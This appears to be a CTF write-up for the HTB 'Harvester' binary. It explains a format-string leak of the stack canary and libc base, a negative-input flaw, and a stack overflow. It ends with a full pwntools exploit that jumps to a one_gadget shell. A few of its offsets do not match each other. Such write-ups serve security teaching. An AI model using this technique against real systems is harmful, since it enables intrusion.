--- 
layout: post 
title:  "[CA HTB] Harvester"
date: "2021-04-25" 
categories: PWN 
author: eurus 
---

**NOTE this writeup is based to my version of libc due to the fact that the server of the CTF are down now**

This challenge we have all the security protection enabled. And they give us the libc of the server 



```bash
In [1]: from pwn import *

In [2]: context.binary = elf = ELF('./harvester')
[*] '/home/eurus/Documents/Harvester/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

when we run the programm we have this:
```bash
┌──(eurus㉿ctf)-[~/Documents/Harvester]
└─$ ./harvester 

A wild Harvester appeared 🐦

Options:

[1] Fight 👊    [2] Inventory 🎒
[3] Stare 👀    [4] Run 🏃
> 
```

Lets see now the interesting function that manage thos options:


```bash
void fight(){
  char my_input[5] = {0};

  printstr("Choose weapon:");
  printstr(&weapon_str_choice);
  read(stdin, my_input, 5);
  printstr("Your choice is: ");

  printf(my_input); ///////////////////////////////////////////////////////////////////////////

  printstr("You are not strong enough to fight yet.");
  return;
}

void inventory(){
  n_pie_to_drop = 0;
  show_pies(pie);
  printstr(" Do you want to drop some? (y/n) > ");
  read(0, my_input, 2uLL);
  if ( my_input[0] == 'y' ){
    printstr("How many do you want to drop? > ");
    __isoc99_scanf("%d", &n_pie_to_drop);
    pie -= n_pie_to_drop; /////////////////////////////////////////////////////////////////////
    if ( pie <= 0 ){
      printstr(&you_dropped_all_you_pie);
      exit(1);
    }
    show_pies(pie); // print n pie
  }
  return;
}

void stare(){
  char buf[40]; 
  printstr("You try to find its weakness, but it seems invincible..");
  printstr("Looking around, you see something inside a bush.");

  printstr(&you_found_one_pie);
  if ( ++pie == 22 ){ ////////////////////////////////////////////////////////////////////////
    printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
    printstr("\nDo you want to feed it? > ");
    read(0, buf, 64); ////////////////////////////////////////////////////////////////////////
    printstr("This did not work as planned..");
  }
  return;
}

void check_pie(int pie){

  if ( pie <= 0 ){
    printstr(you_dropped_al_your_pie); 
    exit(1);
  }
  if ( pie > 100 || pie == 15 ){ ///////////////////////////////////////////////////////////////
    printstr(you_cannot_carry_more);
    exit(1);
  }
  return;
}

```

So we have some interesting things:
- format string vulnerability inside the fight function but only 5 char taken as input
- we can drop negative number of pie in order to increment our pie 
- in the stare position if we have 22 pie we can make ROP 

We need to spawn a shell in order to be able to cat the flag stored server side.

The plan here is to be able to leak the canary in order to be able to perform a BOF without be detected from the check of the canary and then leak the address of where libc is placed inside the process space and then call a one_gadget 

**ONE_GADGET**: a one gadget is a single gadget that if a certain condition is valid spawn a shell.

The plan is:
1. use the FSB to leak the return address of the ``` main ``` function to the ``` __libc_start_main ```
2. ROP to the one_gadget (we must use one_gadget because we can jump only one time, we cannot make a rop chain!)

first of all I declared some utility function to easily interface with the software.

```python
def leak_at( offset):
    p.recvuntil('> ')       
    p.sendline('1')         
    p.recvuntil('> ')       
    p.sendline(f'%{offset}$p')   
    p.recvuntil('is: ')     
    leak = p.recvuntil('\n')
    return str(leak).strip("b'").strip("\\n'").strip("[1;31m").strip("\\x1b")

def drop_pie(n):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('(y/n)')
    p.sendline('y')
    p.recvuntil('> ')
    p.sendline(str(n))
    return

def stare(payload):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('> ')
    p.send(payload)
```

then we need to leak the stack in order to have ana idea of how the stack is arranged:

```bash
for i in range(1,26):
    log.info(f'leak at {i} '+leak_at(i))
```

```bash
[*] leak at 1 (nil)
[*] leak at 2 (nil)
[*] leak at 3 0x7f01ebfa3c0a
[*] leak at 4 0x20
[*] leak at 5 0x7
[*] leak at 6 0xa70243625
[*] leak at 7 (nil)
[*] leak at 8 (nil)
[*] leak at 9 (nil)
[*] leak at 10 0x7ffd2c675200
[*] leak at 11 0xa0f4472e6be62a00 ##### CANARY
[*] leak at 12 0x7ffd2c675200 ######### SAVED EBP
[*] leak at 13 0x562d7d400eca ######### RET TO HERVEST
[*] leak at 14 0x100000020
[*] leak at 15 0xa0f4472e6be62a00 ##### CANARY
[*] leak at 16 0x7ffd2c675220 ######### SAVED EBP
[*] leak at 17 0x562d7d400fd8 ######### RET TO MAIN
[*] leak at 18 0x7ffd2c675310
[*] leak at 19 0xa0f4472e6be62a00 ##### CANARY
[*] leak at 20 0x562d7d401000 ######### SAVED EBP
[*] leak at 21 0x7f01ebf04d0a ######### RET TO __LIBC_START_MAIN
[*] leak at 22 0x7ffd2c675318
[*] leak at 23 0x100000000
[*] leak at 24 0x562d7d400f90
[*] leak at 25 0x7f01ebf047cf
```

so at the offset 11 we can leak the value of the canary, and at the offset 21 we can leak the return address of the ``` main ``` to the function ``` _libc_start_main ```. Now with the return address of the main leaked we can calculate the offset of the libc inside the process space because:

The return address is just ``` LIBC_BASE + RETURN_IstAddr_INSIDE_LIBC_START_MAIN ```, where the libc_base is randomized from ASLR that is enabled with PIE and the RETURN_IstAddr_INSIDE_LIBC_START_MAIN is the istruction address inside the libc where the main return without counting the random base.

So we can disassemble the libc and search the ``` _libc_start_main ```, then knowing that the shared libraries are mapped to the process space with a page o size 0x1000 we can assume that the last byte and nibble are untouched from the base address, for example here we have ``` 0x7f01ebf04d0a ``` and knowing what we have discussed before we know that the last ``` 0xd0a ``` of the addres are untouched from the randomization of the base address.

The following code is the disassebled of the ``` _libc_start_main ``` inside the glibc on my pc.

```asm
.text:026C20 __libc_start_main proc near             ; DATA XREF: LOAD:00000000000146A8↑o
.text:026C20                 push    r15
.text:026C22                 xor     eax, eax
.text:026C24                 push    r14
.text:026C26                 push    r13
.
.
.
.text:026CFC                 mov     rsi, [rsp+0C8h+var_C8]
.text:026D00                 mov     rdx, [rax]
.text:026D03                 mov     rax, [rsp+0C8h+var_B8]
.text:026D08                 call    rax
.text:026D0A                 mov     edi, eax ########### HERE CALL MAIN FUNC ###########
.text:026D0C ############################################ RET ADDR OF MAIN ##############
.text:026D0C loc_26D0C:                              ; CODE XREF: __libc_start_main+152↓j
.text:026D0C                 call    exit
.text:026D11 ; ---------------------------------------------------------------------------
.text:026D11
.text:026D11 loc_26D11:                              ; CODE XREF: __libc_start_main+5B↑j
.
.
.text:026DF7 __libc_start_main endp
```

So the base of the glibc is ``` leaked_ret_af_main -  0x26D0C ``` now that we have the base adress of the glibc we can ROP into a one_gadget, using the tool ``` one_gadget ``` we can find all the one gadget that are inside a lib.

```bash
┌──(eurus㉿ctf)-[~/Documents/Harvester]
└─$ one_gadget libc.so.6
0xcbd1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

We have 3 one gadget and inside our software we can jump into this because we can calulate their address in the process space adding to its address the leaked base address.

This is the final exploit.

```python
from pwn import *

def leak_at( offset):
    p.recvuntil('> ')       
    p.sendline('1')         
    p.recvuntil('> ')       
    p.sendline(f'%{offset}$p')   
    p.recvuntil('is: ')     
    leak = p.recvuntil('\n')
    return str(leak).strip("b'").strip("\\n'").strip("[1;31m").strip("\\x1b")

def drop_pie(n):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('(y/n)')
    p.sendline('y')
    p.recvuntil('> ')
    p.sendline(str(n))
    return

def stare(payload):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('> ')
    p.send(payload)


p_name = './harvester'

context.binary = elf = ELF(p_name)
libc = ELF('./libc.so.6')

#p = remote('188.166.156.174',32273)
p = elf.process()
#gdb.attach(p)

# offset utili
canary_off   = 11
ret_addr     = 13
main_return  = 21
ADDR_RET_VAL = 0x26d0a

## gadget address
ONE1 = 0xcdb1a
ONE2 = 0xcbd1d
ONE3 = 0xcbd20

## LEAK CANARY
canary = leak_at(canary_off)
log.info('LEAK Canary      > '+canary)

## LEAK MAIN RET
ret_of_main = leak_at(main_return)
log.info('LEAK Ret of main > '+ ret_of_main)

## LEAK LIC BASE ADDRESS
base_libc = int(ret_of_main, 16) - ADDR_RET_VAL
log.info('LEAK base libc   > '+ str(hex(base_libc)))

## LEAK PIE BASE ADDRESS
leak_pie = leak_at(ret_addr)
leak_pie_ret_harvester = int(leak_pie,16)
base_pie = leak_pie_ret_harvester - 0xeca
log.info('LEAK base pie    > '+str(hex(base_pie)))


# set base of pie with leaked address
elf.address = base_pie

#for i in range(1,60):
#    log.info(f'leak at {i} '+leak_at(i))

drop_pie(-11)
canary_int = int(canary,16)

rop = ROP(elf)

payload = b'A'*40+p64(canary_int)+b'AAAAAAAA'+p64(base_libc + ONE3)
stare(payload)

p.interactive()

```

